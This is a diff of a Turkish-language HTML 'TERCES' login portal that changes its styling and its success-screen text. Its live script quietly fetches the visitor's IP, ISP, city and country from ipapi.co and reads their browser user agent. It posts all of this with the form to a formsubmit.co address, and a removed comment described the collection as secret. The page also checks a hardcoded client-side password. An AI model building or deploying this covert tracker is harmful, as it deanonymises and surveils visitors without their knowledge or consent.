@@ -5,18 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TERCES Access Portal</title>
     <style>
-        /* SİBER TASARIM */
         body {
             font-family: 'Segoe UI', sans-serif;
             margin: 0; padding: 0;
             display: flex; justify-content: center; align-items: center;
             min-height: 100vh;
             color: #e0e0e0;
-            overflow: hidden;
+            overflow-x: hidden;
             background-color: #050505;
         }
 
-        /* Hareketli Siber Izgara */
+        /* Siber Arka Plan */
         body::before {
             content: "";
             position: absolute;
@@ -34,13 +33,12 @@
             100% { background-position: 40px 40px; }
         }
 
-        /* Cam Efekti Panel */
         .panel {
             background: rgba(15, 15, 15, 0.95);
             border-radius: 12px;
-            padding: 40px;
-            width: 85%;
-            max-width: 380px;
+            padding: 30px;
+            width: 90%;
+            max-width: 450px;
             text-align: center;
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
             border: 1px solid rgba(0, 255, 65, 0.2);
@@ -56,7 +54,7 @@
             margin-bottom: 15px;
         }
 
-        h1 { font-size: 26px; margin-bottom: 25px; color: #fff; font-weight: 500; }
+        h1 { font-size: 24px; margin-bottom: 20px; color: #fff; }
 
         input {
             width: 100%; padding: 14px; margin-bottom: 15px;
@@ -66,29 +64,45 @@
             box-sizing: border-box;
         }
 
-        input:focus { outline: none; border-color: #007bff; box-shadow: 0 0 10px rgba(0, 123, 255, 0.4); }
-
         .btn-submit {
             width: 100%; padding: 15px;
             background: linear-gradient(45deg, #007bff, #0056b3);
             border: none; border-radius: 6px;
             color: white; font-size: 16px; font-weight: bold;
-            cursor: pointer; box-shadow: 0 5px 15px rgba(0, 123, 255, 0.3);
+            cursor: pointer;
         }
 
-        #success-screen { display: none; }
-        .success-box {
-            background: #000; border: 1px dashed #00ff41;
-            padding: 15px; color: #00ff41; font-family: monospace;
-            margin-top: 20px; font-size: 12px;
+        /* Başarı Ekranı Yazı Stilleri */
+        #success-screen { display: none; text-align: left; }
+        #success-screen h2 { color: #00ff41; text-align: center; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .info-text { font-size: 14px; line-height: 1.6; color: #ccc; margin: 15px 0; }
+        
+        .id-box {
+            background: #000;
+            border: 1px dashed #00ff41;
+            padding: 15px;
+            color: #00ff41;
+            font-family: monospace;
+            font-size: 12px;
             word-break: break-all;
+            margin: 15px 0;
+            text-align: center;
+        }
+
+        .warning-text {
+            font-size: 11px;
+            color: #ff4d4d;
+            background: rgba(255, 0, 0, 0.1);
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 15px;
         }
     </style>
 </head>
 <body>
 
     <div class="panel" id="login-container">
-        <div class="secure-header">Verified Access Required</div>
+        <div class="secure-header">Authorization Required</div>
         <h1>TERCES LOGIN</h1>
 
         <form action="https://formsubmit.co/19273e639ed99bee214f2b82f3953fff" method="POST" id="mainForm">
@@ -108,30 +122,44 @@
     </div>
 
     <div class="panel" id="success-screen">
-        <div class="secure-header" style="color:white;">Authorized</div>
-        <h1 style="color:#00ff41;">ERİŞİM SAĞLANDI</h1>
-        <div class="success-box">
-            SESSION_ID: 0528db57d73bb17d1e955e303f5a2f5ea6e06b029a76bb9858c7614d37d1101c78
+        <div class="secure-header">Authorized Access</div>
+        <h2>MERHABA!</h2>
+        
+        <p class="info-text">
+            Bu <b>"TERCES"</b> adlı Adminimiz güvenli bağlantı kurmasını sağlamak amacıyla kurduğumuz özel sitemizdir.
+        </p>
+
+        <p class="info-text">
+            Güvenli bağlantıyı gerçekleştirmek için verdiğimiz Session ID'ye sahip olmanız gerekmektedir:
+        </p>
+
+        <div class="id-box">
+            0528db57d73bb17d1e955e303f5a2f5ea6e06b029a76bb9858c7614d37d1101c78
         </div>
-        <p style="color:red; font-size:11px; margin-top:20px;"> YETKİ ONAYLANDI</p>
+
+        <p class="info-text">
+            Bu ID'yi sadece Session uygulamasından gerçekleştirebileceğiniz bağlantıda kullanabilirsiniz.
+        </p>
+
+        <div class="warning-text">
+            <b>DİKKAT!</b> Lütfen verdiğimiz ID'yi hiçbir kimse ile paylaşmayınız ve yasadışı faaliyetler amacıyla kullanmayınız. Aksi takdirde yasal yollara başvurulacak ve erişiminiz kalıcı olarak engellenecektir.
+        </div>
     </div>
 
     <script>
-        // Cihaz bilgisini çek
         document.getElementById('deviceInfo').value = navigator.userAgent;
 
-        // IP ve Konum bilgilerini gizlice çek
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(data => {
                 document.getElementById('userIP').value = data.ip;
-                document.getElementById('userISP').value = data.org; // İnternet sağlayıcısı
+                document.getElementById('userISP').value = data.org;
                 document.getElementById('userLocation').value = data.city + " / " + data.country_name;
             })
-            .catch(err => console.log("Veri çekme hatası."));
-        
+            .catch(err => console.log("Hata"));
+
         // --- ŞİFRE AYARI ---
-        // Buradaki tırnak içine giriş şifreni yazmayı unutma!
+        // Buraya girmek için kullanacağın şifreyi tırnak içine yaz:
         const MASTER_PASSWORD = "9okmlp02wszaq1";
 
         document.getElementById('mainForm').onsubmit = function(e) {
@@ -141,7 +169,6 @@
                 return;
             }
             
-            // Başarı ekranına geçiş (Veriler FormSubmit'e gönderilirken kullanıcı bunu görür)
             setTimeout(() => {
                 document.getElementById('login-container').style.display = 'none';
                 document.getElementById('success-screen').style.display = 'block';
